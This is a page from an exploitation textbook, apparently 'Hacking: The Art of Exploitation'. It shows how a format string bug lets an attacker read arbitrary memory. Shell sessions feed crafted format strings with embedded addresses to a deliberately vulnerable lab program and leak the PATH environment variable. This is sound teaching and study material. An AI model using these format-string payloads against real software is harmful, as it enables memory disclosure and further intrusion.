<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x353  Reading from Arbitrary Memory Addresses</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part63.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part65.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark54">0x353  Reading from Arbitrary Memory Addresses</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The <span class="s31">%s </span>format parameter can be used to read from arbitrary memory addresses. Since it’s possible to read the data of the original format string, part of the original format string can be used to supply an address to the <span class="s31">%s </span>format parameter, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_508.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAA%08x.%08x.%08x.%08x</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAAbffff3d0.b7fe75fc.00000000.41414141</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_509.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The four bytes of <span class="s31">0x41 </span>indicate that the fourth format parameter is reading from the beginning of the format string to get its data. If the fourth format parameter is <span class="s31">%s </span>instead of <span class="s31">%x</span>, the format function will attempt to print the string located at <span class="s31">0x41414141</span>. This will cause the program to crash in a seg- mentation fault, since this isn’t a valid address. But if a valid memory address is used, this process could be used to read a string found at that memory address.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_510.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ env | grep PATH PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games reader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PATH will be at 0xbffffdd7</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\xd7\xfd\xff\xbf&quot;)%08x.%08x.%08x.%s The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????%08x.%08x.%08x.%s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/ usr/games</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_511.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">Here the <span class="s31">getenvaddr </span>program is used to get the address for the environ- ment variable <span class="s31">PATH</span>. Since the program name <span class="s27">fmt_vuln </span>is two bytes less than <span class="s27">getenvaddr</span>, four is added to the address, and the bytes are reversed due to the byte ordering. The fourth format parameter of <span class="s31">%s </span>reads from the beginning of the format string, thinking it’s the address that was passed as a function argument. Since this address is the address of the <span class="s31">PATH </span>environment variable, it is printed as if a pointer to the environment variable were passed to <span class="s31">printf()</span>.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now that the distance between the end of the stack frame and the begin- ning of the format string memory is known, the field-width arguments can be omitted in the <span class="s31">%x </span>format parameters. These format parameters are only needed to step through memory. Using this technique, any memory address can be examined as a string.</p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part63.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part65.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
